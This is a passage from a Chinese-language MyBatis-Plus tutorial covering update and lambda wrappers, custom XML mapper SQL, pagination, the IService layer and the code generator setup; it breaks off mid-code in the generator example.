<h3 id="5-4-常用UpdateWrapper方法"><a href="#5-4-常用UpdateWrapper方法" class="headerlink" title="5.4 常用UpdateWrapper方法"></a>5.4 常用UpdateWrapper方法</h3><p>​        我们前面在使用update方法时需要创建一个实体类对象传入，用来指定要更新的列及对应的值。但是如果需要更新的列比较少时，创建这么一个对象显的有点麻烦和复杂。</p>
<p>​        我们可以使用UpdateWrapper的set方法来设置要更新的列及其值。同时这种方式也可以使用Wrapper去指定更复杂的更新条件。</p>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>SQL语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE </span><br><span class="line">	USER</span><br><span class="line">SET </span><br><span class="line">	age = 99</span><br><span class="line">where </span><br><span class="line">	id &gt; 1</span><br></pre></td></tr></table></figure>

<p>​    我们想把id大于1的用户的年龄修改为99，则可以使用如下写法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testUpdateWrapper</span><span class="params">()</span></span>&#123;</span><br><span class="line">    UpdateWrapper&lt;User&gt; updateWrapper = <span class="keyword">new</span> UpdateWrapper&lt;&gt;();</span><br><span class="line">    updateWrapper.gt(<span class="string">&quot;id&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    updateWrapper.set(<span class="string">&quot;age&quot;</span>,<span class="number">99</span>);</span><br><span class="line">    userMapper.update(<span class="keyword">null</span>,updateWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h3 id="5-5-Lambda条件构造器"><a href="#5-5-Lambda条件构造器" class="headerlink" title="5.5 Lambda条件构造器"></a>5.5 Lambda条件构造器</h3><p>​    我们前面在使用条件构造器时列名都是用字符串的形式去指定。这种方式无法在编译期确定列名的合法性。</p>
<p>​    所以MP提供了一个Lambda条件构造器可以让我们直接以实体类的方法引用的形式来指定列名。这样就可以弥补上述缺陷。</p>
<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>要执行的查询对应的SQL如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name,PASSWORD,NAME,age,address </span><br><span class="line">FROM </span><br><span class="line">	USER </span><br><span class="line">WHERE </span><br><span class="line">	age &gt; 18 AND address = &#x27;狐山&#x27;</span><br></pre></td></tr></table></figure>

<p>如果使用之前的条件构造器写法如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testLambdaWrapper</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> QueryWrapper();</span><br><span class="line">    queryWrapper.gt(<span class="string">&quot;age&quot;</span>,<span class="number">18</span>);</span><br><span class="line">    queryWrapper.eq(<span class="string">&quot;address&quot;</span>,<span class="string">&quot;狐山&quot;</span>);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(queryWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果使用Lambda条件构造器写法如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testLambdaWrapper2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LambdaQueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> LambdaQueryWrapper&lt;&gt;();</span><br><span class="line">    queryWrapper.gt(User::getAge,<span class="number">18</span>);</span><br><span class="line">    queryWrapper.eq(User::getAddress,<span class="string">&quot;狐山&quot;</span>);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(queryWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="6-自定义SQL"><a href="#6-自定义SQL" class="headerlink" title="6.自定义SQL"></a>6.自定义SQL</h2><p>​    虽然MP为我们提供了很多常用的方法，并且也提供了条件构造器。但是如果真的遇到了复杂的SQL时，我们还是需要自己去定义方法，自己去写对应的SQL，这样SQL也更有利于后期维护。</p>
<p>​    因为MP是对mybatis做了增强，所以还是支持之前Mybatis的方式去自定义方法。</p>
<p>​    同时也支持在使用Mybatis的自定义方法时使用MP的条件构造器帮助我们进行条件构造。</p>
<p>​    接下去我们分别来讲讲。</p>
<h3 id="6-0-准备工作"><a href="#6-0-准备工作" class="headerlink" title="6.0 准备工作"></a>6.0 准备工作</h3><p>①准备数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE `orders` (</span><br><span class="line">  `id` bigint(20) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `price` int(11) DEFAULT NULL COMMENT &#x27;价格&#x27;,</span><br><span class="line">  `remark` varchar(100) DEFAULT NULL COMMENT &#x27;备注&#x27;,</span><br><span class="line">  `user_id` int(11) DEFAULT NULL COMMENT &#x27;用户id&#x27;,</span><br><span class="line">  `update_time` timestamp NULL DEFAULT NULL COMMENT &#x27;更新时间&#x27;,</span><br><span class="line">  `create_time` timestamp NULL DEFAULT NULL COMMENT &#x27;创建时间&#x27;,</span><br><span class="line">  `version` int(11) DEFAULT &#x27;1&#x27; COMMENT &#x27;版本&#x27;,</span><br><span class="line">  `del_flag` int(1) DEFAULT &#x27;0&#x27; COMMENT &#x27;逻辑删除标识,0-未删除,1-已删除&#x27;,</span><br><span class="line">  `create_by` varchar(100) DEFAULT NULL COMMENT &#x27;创建人&#x27;,</span><br><span class="line">  `update_by` varchar(100) DEFAULT NULL COMMENT &#x27;更新人&#x27;,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">/*Data for the table `orders` */</span><br><span class="line"></span><br><span class="line">insert  into `orders`(`id`,`price`,`remark`,`user_id`,`update_time`,`create_time`,`version`,`del_flag`,`create_by`,`update_by`) values (1,2000,&#x27;无&#x27;,2,&#x27;2021-08-24 21:02:43&#x27;,&#x27;2021-08-24 21:02:46&#x27;,1,0,NULL,NULL),(2,3000,&#x27;无&#x27;,3,&#x27;2021-08-24 21:03:32&#x27;,&#x27;2021-08-24 21:03:35&#x27;,1,0,NULL,NULL),(3,4000,&#x27;无&#x27;,2,&#x27;2021-08-24 21:03:39&#x27;,&#x27;2021-08-24 21:03:41&#x27;,1,0,NULL,NULL);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>②创建实体类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Orders</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 价格</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer price;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 备注</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String remark;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer userId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新时间</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime updateTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建时间</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime createTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 版本</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer version;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 逻辑删除标识,0-未删除,1-已删除</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer delFlag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="6-1-Mybatis方式"><a href="#6-1-Mybatis方式" class="headerlink" title="6.1 Mybatis方式"></a>6.1 Mybatis方式</h3><h4 id="①定义方法"><a href="#①定义方法" class="headerlink" title="①定义方法"></a>①定义方法</h4><p>​    在Mapper接口中定义方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> <span class="keyword">extends</span> <span class="title">BaseMapper</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">User <span class="title">findMyUser</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="②创建xml"><a href="#②创建xml" class="headerlink" title="②创建xml"></a>②创建xml</h4><p>​    先配置xml文件的存放目录</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath*:/mapper/**/*.xml</span></span><br></pre></td></tr></table></figure>



<p>​    创建对应的xml映射文件</p>
<h4 id="③在xml映射文件中编写SQL"><a href="#③在xml映射文件中编写SQL" class="headerlink" title="③在xml映射文件中编写SQL"></a>③在xml映射文件中编写SQL</h4><p>​    创建对应的标签，编写对应的SQL语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE mapper PUBLIC <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span> &gt;</span><br><span class="line">&lt;mapper namespace=<span class="string">&quot;com.sangeng.mapper.UserMapper&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;select id=<span class="string">&quot;findMyUser&quot;</span> resultType=<span class="string">&quot;com.sangeng.domian.User&quot;</span>&gt;</span><br><span class="line">       select * from user where id = #&#123;id&#125; </span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">&lt;/mapper&gt;</span><br></pre></td></tr></table></figure>







<h3 id="6-2-Mybatis方式结合条件构造器"><a href="#6-2-Mybatis方式结合条件构造器" class="headerlink" title="6.2 Mybatis方式结合条件构造器"></a>6.2 Mybatis方式结合条件构造器</h3><p>​    我们在使用上述方式自定义方法时。如果也希望我们的自定义方法能像MP自带方法一样使用条件构造器来进行条件构造的话只需要使用如下方式即可。</p>
<p>①方法定义中添加Warpper类型的参数</p>
<p>添加Warpper类型的参数，并且要注意给其指定参数名。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> <span class="keyword">extends</span> <span class="title">BaseMapper</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">User <span class="title">findMyUserByWrapper</span><span class="params">(<span class="meta">@Param(Constants.WRAPPER)</span> Wrapper&lt;User&gt; wrapper)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>②在SQL语句中获取Warpper拼接的SQL片段进行拼接。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findMyUserByWrapper&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.sangeng.domian.User&quot;</span>&gt;</span></span><br><span class="line">    select * from user $&#123;ew.customSqlSegment&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意：不能使用#{}应该用${}</p>
<h2 id="7-分页查询"><a href="#7-分页查询" class="headerlink" title="7.分页查询"></a>7.分页查询</h2><h3 id="7-1-基本分页查询"><a href="#7-1-基本分页查询" class="headerlink" title="7.1 基本分页查询"></a>7.1 基本分页查询</h3><p>①配置分页查询拦截器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PageConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 3.4.0之前的版本</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">   <span class="comment">/* @Bean</span></span><br><span class="line"><span class="comment">    public PaginationInterceptor paginationInterceptor()&#123;</span></span><br><span class="line"><span class="comment">        return  new PaginationInterceptor();</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 3.4.0之后版本</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> MybatisPlusInterceptor <span class="title">mybatisPlusInterceptor</span><span class="params">()</span></span>&#123;</span><br><span class="line">       MybatisPlusInterceptor mybatisPlusInterceptor = <span class="keyword">new</span> MybatisPlusInterceptor();</span><br><span class="line">       mybatisPlusInterceptor.addInnerInterceptor(<span class="keyword">new</span> PaginationInnerInterceptor());</span><br><span class="line">       <span class="keyword">return</span> mybatisPlusInterceptor;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>②进行分页查询</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testPage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    IPage&lt;User&gt; page = <span class="keyword">new</span> Page&lt;&gt;();</span><br><span class="line">    <span class="comment">//设置每页条数</span></span><br><span class="line">    page.setSize(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">//设置查询第几页</span></span><br><span class="line">    page.setCurrent(<span class="number">1</span>);</span><br><span class="line">    userMapper.selectPage(page, <span class="keyword">null</span>);</span><br><span class="line">    System.out.println(page.getRecords());<span class="comment">//获取当前页的数据</span></span><br><span class="line">    System.out.println(page.getTotal());<span class="comment">//获取总记录数</span></span><br><span class="line">    System.out.println(page.getCurrent());<span class="comment">//当前页码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="继承Iservice接口"><a href="#继承Iservice接口" class="headerlink" title="继承Iservice接口"></a>继承Iservice接口</h5><p><a href="#service">继承Iservice接口</a>后则更简单,同时可以很好的配合restful风格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;/page&#123;p&#125;&quot;)</span><br><span class="line">    public ResponseResult page(@PathVariable(&quot;p&quot;)Integer p)&#123;</span><br><span class="line">        IPage&lt;User&gt; page=new Page&lt;&gt;();</span><br><span class="line">        page.setSize(10);</span><br><span class="line">        page.setCurrent(p);</span><br><span class="line">        userService.page(page,null);</span><br><span class="line">        return new ResponseResult(200,&quot;这是第&quot;+p+&quot;页用户&quot;,page.getRecords());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>







<h3 id="7-2-多表分页查询"><a href="#7-2-多表分页查询" class="headerlink" title="7.2 多表分页查询"></a>7.2 多表分页查询</h3><p>​    如果需要在多表查询时进行分页查询的话，就可以在mapper接口中自定义方法，然后让方法接收Page对象。</p>
<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><h5 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h5><p>​    我们需要去查询Orders表，并且要求查询的时候除了要获取到Orders表中的字段，还要获取到每个订单的下单用户的用户名。</p>
<h5 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h5><h6 id="SQL准备"><a href="#SQL准备" class="headerlink" title="SQL准备"></a>SQL准备</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	o.*,u.`user_name`</span><br><span class="line">FROM </span><br><span class="line">	USER u,orders o</span><br><span class="line">WHERE </span><br><span class="line">	o.`user_id` = u.`id`</span><br></pre></td></tr></table></figure>

<h6 id="实体类修改"><a href="#实体类修改" class="headerlink" title="实体类修改"></a>实体类修改</h6><p>增加一个userName属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Orders</span>  </span>&#123;</span><br><span class="line">	<span class="comment">//省略无关代码</span></span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p>①定义接口，定义方法</p>
<p>方法第一个测试定义成Page类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrdersMapper</span> <span class="keyword">extends</span> <span class="title">BaseMapper</span>&lt;<span class="title">Orders</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">IPage&lt;Orders&gt; <span class="title">findAllOrders</span><span class="params">(Page&lt;Orders&gt; page)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>在xml中不需要关心分页操作，MP会帮我们完成。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.sangeng.mapper.OrdersMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findAllOrders&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.sangeng.domian.Orders&quot;</span>&gt;</span></span><br><span class="line">        SELECT</span><br><span class="line">            o.*,u.`user_name`</span><br><span class="line">        FROM</span><br><span class="line">            USER u,orders o</span><br><span class="line">        WHERE</span><br><span class="line">            o.`user_id` = u.`id`</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后调用方法测试即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> OrdersMapper ordersMapper;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testOrdersPage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Page&lt;Orders&gt; page = <span class="keyword">new</span> Page&lt;&gt;();</span><br><span class="line">    <span class="comment">//设置每页大小</span></span><br><span class="line">    page.setSize(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">//设置当前页码</span></span><br><span class="line">    page.setCurrent(<span class="number">2</span>);</span><br><span class="line">    ordersMapper.findAllOrders(page);</span><br><span class="line">    System.out.println(page.getRecords());</span><br><span class="line">    System.out.println(page.getTotal());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="8-Service-层接口"><a href="#8-Service-层接口" class="headerlink" title="8.Service 层接口"></a>8.Service 层接口</h2><p>​    MP也为我们提供了<span id="service">Service</span>层的实现。我们只需要编写一个接口，继承<code>IService</code>，并创建一个接口实现类继承<code>ServiceImpl</code>，即可使用。</p>
<p>​    相比于Mapper接口，Service层主要是支持了更多批量操作的方法。</p>
<h3 id="8-1-基本使用"><a href="#8-1-基本使用" class="headerlink" title="8.1 基本使用"></a>8.1 基本使用</h3><h4 id="8-1-1-改造前"><a href="#8-1-1-改造前" class="headerlink" title="8.1.1 改造前"></a>8.1.1 改造前</h4><p>定义接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">list</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>定义实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">list</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.selectList(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="8-1-2-改造后"><a href="#8-1-2-改造后" class="headerlink" title="8.1.2 改造后"></a>8.1.2 改造后</h4><p>接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> <span class="keyword">extends</span> <span class="title">IService</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">extends</span> <span class="title">ServiceImpl</span>&lt;<span class="title">UserMapper</span>,<span class="title">User</span>&gt; <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSeervice</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List&lt;User&gt; list = userService.list();</span><br><span class="line">    System.out.println(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="8-2自定义方法"><a href="#8-2自定义方法" class="headerlink" title="8.2自定义方法"></a>8.2自定义方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> <span class="keyword">extends</span> <span class="title">IService</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">User <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">extends</span> <span class="title">ServiceImpl</span>&lt;<span class="title">UserMapper</span>,<span class="title">User</span>&gt; <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OrdersMapper ordersMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        UserMapper userMapper = getBaseMapper();</span><br><span class="line">        List&lt;Orders&gt; orders = ordersMapper.selectList(<span class="keyword">null</span>);</span><br><span class="line">        User user = userMapper.selectById(<span class="number">3</span>);</span><br><span class="line">        <span class="comment">//查询用户对于的订单</span></span><br><span class="line">        QueryWrapper&lt;Orders&gt; wrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">        wrapper.eq(<span class="string">&quot;user_id&quot;</span>,<span class="number">3</span>);</span><br><span class="line">        List&lt;Orders&gt; ordersList = ordersMapper.selectList(wrapper);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h2 id="9-代码生成器"><a href="#9-代码生成器" class="headerlink" title="9.代码生成器"></a>9.代码生成器</h2><p>​    MP提供了一个代码生成器，可以让我们一键生成实体类，Mapper接口，Service，Controller等全套代码 。使用方式如下</p>
<h3 id="①添加依赖"><a href="#①添加依赖" class="headerlink" title="①添加依赖"></a>①添加依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--mybatisplus代码生成器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--模板引擎--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.freemarker<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>freemarker<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="②生成"><a href="#②生成" class="headerlink" title="②生成"></a>②生成</h3><p>​    修改相应配置后执行以下代码即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GeneratorTest</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Test</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">generate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		AutoGenerator generator = <span class="keyword">new</span> AutoGenerator();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 全局配置</span></span><br><span class="line">		GlobalConfig config = <span class="keyword">new</span> GlobalConfig();</span><br><span class="line">		String projectPath = System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line">		<span class="comment">// 设置输出到的目录</span></span><br><span class="line">		config.setOutputDir(projectPath + <span class="string">&quot;/src/main/java&quot;</span>);</span><br><span class="line">		config.setAuthor(<span class="string">&quot;sangeng&quot;</span>);</span><br><span class="line">		<span class="comment">// 生成结束后是否打开文件夹</span></span><br><span class="line">		config.setOpen(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 全局配置添加到 generator 上</span></span><br><span class="line">		generator.setGlobalConfig(config);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 数据源配置</span></span><br><span class="line">		DataSourceConfig dataSourceConfig = <span class="keyword">new</span> DataSourceConfig();</span><br><span class="line">		dataSourceConfig.setUrl(<span class="string">&quot;jdbc:mysql://localhost:3306/mp_db?characterEncoding=utf-8&amp;serverTimezone=UTC&quot;</span>);</span><br><span class="line">		dataSourceConfig.setDriverName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">		dataSourceConfig.setUsername(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">		dataSourceConfig.setPassword(<span class="string">&quot;root&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 数据源配置添加到 generator</span></span><br><span class="line">		generator.setDataSource(dataSourceConfig);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 包配置, 